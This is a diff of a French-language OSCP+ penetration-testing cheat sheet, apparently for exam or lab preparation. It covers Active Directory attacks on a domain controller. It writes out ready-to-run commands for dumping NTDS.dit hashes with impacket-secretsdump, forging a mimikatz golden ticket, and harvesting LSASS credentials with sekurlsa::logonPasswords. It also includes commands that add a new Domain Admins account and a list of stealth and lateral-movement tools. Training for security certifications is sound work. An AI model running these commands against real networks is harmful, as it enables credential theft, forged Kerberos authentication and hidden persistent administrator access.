+Commande `c` pour la rubrique « Targeted AD Attacks on DC ».
 
 ```text
 C:\Windows\NTDS\
 ```
 
 
-```text
-NTDS.dit
-```
+**Paramètres et repères :**
+`NTDS.dit` · `SYSTEM` · `impacket-secretsdump`  
 
 
-```text
-SYSTEM
-```
-
-
-```text
-impacket-secretsdump
-```
-
+Commande `impacket-secretsdump` pour la rubrique « Targeted AD Attacks on DC ».
 
 ```bash
 impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
@@ -1690,8 +1362,8 @@ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 
 #### Golden Ticket Attack for Persistent Access
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `kerberos` pour la rubrique « Golden Ticket Attack for Persistent Access ».
 
 ```powershell
 kerberos::golden /domain:<domain> /sid:<domain_SID> /krbtgt:<NTLM_hash> /user:Administrator
@@ -1703,15 +1375,11 @@ kerberos::golden /domain:<domain> /sid:<domain_SID> /krbtgt:<NTLM_hash> /user:Ad
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-```text
-LSASS
-```
+**Paramètres et repères :**
+`LSASS` · `Mimikatz`  
 
 
-```text
-Mimikatz
-```
-
+Commande `mimikatz` pour la rubrique « Credential Harvesting with LSASS ».
 
 ```powershell
 mimikatz # sekurlsa::logonPasswords
@@ -1720,23 +1388,29 @@ mimikatz # sekurlsa::logonPasswords
 
 ### Post-Exploitation and Flag Collection
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `c` pour la rubrique « Post-Exploitation and Flag Collection ».
 
 ```text
 C:\\Users\\Public
 ```
 
 
+Commande `c` pour la rubrique « Post-Exploitation and Flag Collection ».
+
 ```text
 C:\\Users\\[Administrator/any_user]\\Desktop
 ```
 
 
+Commande `hostname` pour la rubrique « Post-Exploitation and Flag Collection ».
+
 ```powershell
 hostname && whoami && ipconfig /all && type [local/proof].txt
 ```
 
+
+Commande `net` pour la rubrique « Post-Exploitation and Flag Collection ».
 
 ```powershell
 net user new_admin <password> /add /domain
@@ -1744,41 +1418,15 @@ net group "Domain Admins" new_admin /add /domain
 ```
 
 
-### Additional Tips for Efficiency and Stealth
-
-Commandes, paramètres et exemples associés à cette technique.
+### Complémentaire Tips for Efficiency and Stealth
 
 
-```powershell
-Invoke-Obfuscation
-```
-
-
-```text
-RDP
-```
-
-
-```text
-WinRM
-```
-
-
-```text
-SMBexec
-```
-
-
-```text
-CrackMapExec
-```
-
-
-```text
-Evil-WinRM
-```
-
+**Paramètres et repères :**
+`Invoke-Obfuscation` · `RDP` · `WinRM` · `SMBexec`  
+`CrackMapExec` · `Evil-WinRM`  
 
 ---
 
 Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).
+
+<!-- refined-oscp -->
